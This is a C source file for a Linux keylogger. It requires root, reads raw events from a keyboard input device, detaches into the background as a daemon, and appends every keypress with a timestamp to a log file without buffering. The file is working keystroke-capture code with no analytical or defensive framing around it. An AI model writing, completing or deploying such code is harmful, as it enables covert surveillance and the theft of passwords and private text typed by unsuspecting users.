#include <stdio.h>
#include <fcntl.h>   // open
#include <errno.h>   // strerror
#include <stdlib.h>
#include <unistd.h>  // daemon, close
#include <time.h>    // For time property
#include <string.h>  
#include <stdint.h>
#include <assert.h>
#include <linux/input.h> //standad input linux library

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <error.h>
#include <signal.h>
#include <unistd.h>
#include <syslog.h>

#include "configuration.h"
#include "opt.h"

#define KEYPRESS 1
#define KEYRELEASE 0

//typedef struct inputEvent keyboardEvent;
typedef struct inputEvent{
   struct timeval time;
   __u16 set;
   __u16 protocol;
   __s32 value;
} keyboardEvent;


static void adminCheck();
static int keyboardFile(char *specialFile);
       char* getTime();

/**
 * Exit with return protocol -1 if user does not have admin privileges
 */
static void adminCheck(){
   if (geteuid() != 0){  //built in method getuid() 
      
      printf("\nYou must run as a root/admin \n \n");
      exit(-1);
   
   }
}

/*
 * Opens the keyboard device file
*/
static int keyboardFile(char *specialFile){
   int fd = open(specialFile, O_RDONLY);  //creating a read-only file
   if (fd == -1){
      printf("%s", strerror(errno));
      exit(-1);
   }

   return fd;
}

//time property (need to change it up)
char* getTime(){

  time_t currentTime;
  struct tm* timePtr;

  time(&currentTime);
  timePtr = localtime(&currentTime);

    
  static char retrivalValue[20]; // MThis variable must be static, otherwise it won't work
  strftime(retrivalValue, sizeof(retrivalValue), "%Y-%m-%d %H:%M:%S", timePtr); //formatted: YEAR/MONTH/DAY , CURRENT TIME

  return retrivalValue;
}

int main(int argc, char **argv){

  adminCheck();
     
  Configuration configuration;
  parseOpt(argc, argv, &configuration);


  int fd = keyboardFile(configuration.specialFile);
  assert(fd > 0);

  FILE *myLogFile = fopen(configuration.myLogFile, "a");
  if (myLogFile == NULL){
     printf(" \nCould not open the log file \n");
     exit(-1);
  }

  // Our file should get updated on every keypress, so we will have to disable the buffering
  setbuf(myLogFile, NULL);

  // Daemonize process. Don't change working directory but redirect standard
  // inputs and outputs to /dev/null
  if (daemon(1, 0) == -1){
    printf("%s", strerror(errno));
    exit(-1);

  }

  //input event
  int shiftCount = 0;
  keyboardEvent event;   

  //Header of my Log file
  char *header = "\n     ***This is a log file of all the keyboard keys pressed***   \n \n";
  fputs(header, myLogFile); 

   while (read(fd, &event, sizeof(keyboardEvent)) > 0){
      if (event.set == EV_KEY){ //EY_KEY is defined already in a library
         if (event.value == KEYPRESS){
            if (boolShift(event.protocol)){
               shiftCount++;
            }
            
            char *name = getKey(event.protocol, shiftCount);
            char *newLine = "\n";
            char *space = "       --  (key got pressed at)  ----->    ";
            char *space2 = "                  --  (key got pressed at)  ----->    ";

              if (strcmp(name, UnknownKey) != 0){
                printf("%s ", name);
                fputs(newLine, myLogFile);

                if(strlen(getKey(event.protocol, shiftCount)) >= 4){

                  fputs(name, myLogFile);
                  fputs(space, myLogFile);
                  fputs(getTime(), myLogFile);
                  fputs(newLine, myLogFile);
                }else{

                  fputs(name, myLogFile);  //to add the key stroke in the log file
                  fputs(space2, myLogFile);
                  fputs(getTime(), myLogFile);
                  fputs(newLine, myLogFile); //to add a new line between the two keyboard strokes
                }
              }
            }else if (event.value == KEYRELEASE){
              
              if (boolShift(event.protocol)){
                 shiftCount--;
              }
         }
      }
   }

  cleanup(&configuration);
  fclose(myLogFile);
  close(fd);

  return 0;
}